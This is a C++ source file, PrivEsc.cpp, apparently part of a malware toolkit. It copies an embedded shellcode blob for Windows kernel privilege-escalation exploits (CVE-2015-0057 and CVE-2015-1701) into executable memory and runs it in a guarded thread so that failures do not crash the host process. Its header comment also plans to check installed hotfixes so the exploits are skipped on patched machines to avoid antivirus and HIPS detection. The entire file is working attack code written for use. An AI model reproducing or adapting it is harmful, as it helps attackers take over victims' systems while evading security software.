/*
	PrivEsc.cpp

	Privilege Escalation routines for IDD

	TBD:
	Do not execute exploits if patches are already installed, to prevent possible AV/HIPS detection
	hotfix checker - enum reg keys
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Hotfix
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Updates
	HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Component Based Servicing\Packages (to be checked at win7+)

	and find all subkeys in all deep with KBnnnnnn-xxxx style (n count differs)
*/

#include <windows.h>

#include "..\inc\mem.h"
#include "..\inc\dbg.h"

/*
	PrivEsc routines used:
	CVE-2015-0057, MS15-010, KBs: 3013455, 3023562
	CVE-2015-1701, MS15-051, KBs: 3045171
*/
#include "privesc_2015__0057_1701.h"	// jun-2015 patched 

#include "PrivEsc.h"

DWORD g_dwTargetExceptionThreadId;

// do not call DbgPrint here 
LONG CALLBACK VectoredHandler(PEXCEPTION_POINTERS ExceptionInfo)
{
	//DbgPrint("handler entered");

	// check if handler called for our target thread
	if (GetCurrentThreadId() == g_dwTargetExceptionThreadId) {	ExitThread(255); }

	return EXCEPTION_CONTINUE_SEARCH;
}



DWORD WINAPI thrpeRunner(LPVOID lpParameter)
{
	PE_THREAD_PARAMS *pt = (PE_THREAD_PARAMS *)lpParameter;	// input params

	DbgPrint("entered");

	pt->bExecResult = pt->sepExploitExec(GetCurrentProcessId());

	DbgPrint("finished exec with %u result", pt->bExecResult);

	ExitThread(pt->bExecResult);
}



VOID privescDo()
{
	//SHELL_ENTRY_PROC GetSystemPWNED = NULL; 
	PE_THREAD_PARAMS pt = { 0 };

	LPVOID pHandler = NULL;	// vectored exception handler handle

	HANDLE hThread = NULL;

	DWORD dwExitCode = 0;

	DbgPrint("entered");

	do { // not a loop

		if (!(pt.sepExploitExec = (SHELL_ENTRY_PROC)VirtualAlloc(NULL, sizeof(ShellData), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE))) { DbgPrint("ERR: VirtualAlloc() failed, code %p", GetLastError()); break; }

		memcpy(pt.sepExploitExec, ShellData, sizeof(ShellData));

		DbgPrint("moved privesc codes to %p, adding exception handler", pt.sepExploitExec);

		// due to direct mem load, install special handler to prevent process termination in case of foreign code problems
		if (!(pHandler = AddVectoredExceptionHandler(0, &VectoredHandler))) { DbgPrint("ERR: failed to add vectored handler"); break; }

		// create executing thread
		DbgPrint("creating runner thread");
		hThread = CreateThread(NULL, 0, thrpeRunner, &pt, 0, &g_dwTargetExceptionThreadId);
		DbgPrint("created runner thread id %u", g_dwTargetExceptionThreadId);

		// wait a bit for execution
		if (WAIT_OBJECT_0 != WaitForSingleObject(hThread, 60000)) { DbgPrint("ERR: execution timeout"); TerminateThread(hThread, 0); }

#ifdef _DEBUG
		// dbg query thread's exit code
		dwExitCode = 0;
		if (!GetExitCodeThread(hThread, &dwExitCode)) { DbgPrint("ERR: failed to get thread exit code, le %u", GetLastError()); }
		DbgPrint("done with %u result, thread exit code %u", pt.bExecResult, dwExitCode);
#endif

	} while (FALSE);	// not a loop

	// free resources
	if (pt.sepExploitExec) { DbgPrint("disposing codes"); VirtualFree(pt.sepExploitExec, sizeof(ShellData), MEM_RELEASE); DbgPrint("disposed"); }
	if (hThread) { CloseHandle(hThread); }
	if (pHandler) { RemoveVectoredExceptionHandler(pHandler); }

}